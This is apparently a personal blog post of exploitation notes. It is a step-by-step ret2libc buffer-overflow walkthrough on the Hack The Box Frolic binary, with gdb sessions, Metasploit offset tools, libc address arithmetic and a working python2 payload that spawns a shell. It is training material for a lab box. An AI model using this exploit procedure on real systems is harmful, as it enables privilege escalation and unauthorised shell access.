---
layout: post
title: Ret2libc - system()
description: Ret2libc - system()
summary: Ret2libc - system()
tags: [bof,privesc]
minute: 1
---
## Overview
* This makes use of existing `libc` by calling `system("/bin/sh")`
* You can use this attack on the following scenarios:
	* NX bit is set (e.g it it SEGFAULTS on NOPs `\x90909090`)
	* `GNU_STACK` doesn't contain `RWE` in `readelf -l ./app` output
* Example below is from HTB Frolic box

## Sample Program
```bash
➜  loot ./rop hello                                                                                      
[+] Message sent: hello                                                                            ➜  loot 
```

## Steps
* Find what buffer length program crashes

```bash
➜  loot ./rop `python2 -c "print('A'*100)"`                                                              
[1]    325422 segmentation fault  ./rop `python2 -c "print('A'*100)"`
➜  loot 

# it crashes at about 100 characters
```

* Find the exact locaton of EIP

```bash
➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
➜  loot 
➜  loot gdb ./rop
[...redacted...]
(gdb) disas vuln
[...redacted...]
   0x08048508 <+16>:	call   0x8048350 <strcpy@plt>
   0x0804850d <+21>:	add    $0x10,%esp
[...redacted...]
   0x08048531 <+57>:	ret    
End of assembler dump.
(gdb) br *vuln+16
Breakpoint 1 at 0x8048508
(gdb) br *vuln+21
Breakpoint 2 at 0x804850d
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/kali/data/practice/hack_the_box/linux/frolic/results/frolic/loot/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 1, 0x08048508 in vuln ()
(gdb) c
Continuing.

Breakpoint 2, 0x0804850d in vuln ()
(gdb) info frame
Stack level 0, frame at 0xffffce20:
 eip = 0x804850d in vuln; saved eip = 0x62413762
 called by frame at 0xffffce24
 Arglist at 0xffffce18, args: 
 Locals at 0xffffce18, Previous frame's sp is 0xffffce20
 Saved registers:
  ebp at 0xffffce18, eip at 0xffffce1c
(gdb) quit
[...redacted...]
➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762
[*] Exact match at offset 52
➜  loot 

# EIP offset is 52
```

* Find base address of libc

```bash
➜  loot ldd ./rop          
	linux-gate.so.1 (0xf7fcf000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dbc000)
	/lib/ld-linux.so.2 (0xf7fd1000)
➜  loot 

# libc_base_addr = 0xf7dbc000
```

* Find address of `system()`. 

```bash
➜  loot readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
  1561: 00045160    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
➜  loot 

# system_addr = libc_base_addr + 00045160
#             = 0xf7e01160
```

* Find address of `exit()`

```bash
➜  loot readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
   152: 00037af0    33 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.0
[...redacted...]
➜  loot 

# exit_addr = libc_base_addr + 00037af0
#           = 0xf7df3af0
```

* Find address of `/bin/sh`

```bash
➜  loot strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 18f924 /bin/sh
➜  loot 

# bin_sh_addr = libc_base_addr + 18f924
#             = F7F4B924
```

* Construct payload

```bash
# NOP + system_addr + exit_addr + bin_sh_addr
python2 -c "print('A'*52 + '\x60\x11\xe0\xf7' + '\xf0\x3a\xdf\xf7' + '\x24\xb9\xf4\xf7')"
```

* Run and enjoy

```bash
➜  loot ./rop `python2 -c "print('A'*52 + '\x60\x11\xe0\xf7' + '\xf0\x3a\xdf\xf7' + '\x24\xb9\xf4\xf7')"`
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),120(wireshark),134(scanner),142(kaboxer)
$ 
```

## Gotchas
* If you tried the steps above by getting a copy of vulnerable program and testing it on your local or attacker machine, you might need to change the memory addresses (`libc_base_addr`, `system_addr`, and `bin_sh_addr`) once you run it on the victim machine. That's because memory address on victim might be different from the attacker machine.

## References
* [Introduction to exploiting Part 4 – ret2libc – Stack6 (Protostar)](https://ironhackers.es/en/tutoriales/introduccion-al-exploiting-parte-4-ret2libc-stack-6-protostar/)
* [Performing a ret2libc Attack - defeating a non-executable stack](https://shellblade.net/files/docs/ret2libc.pdf)
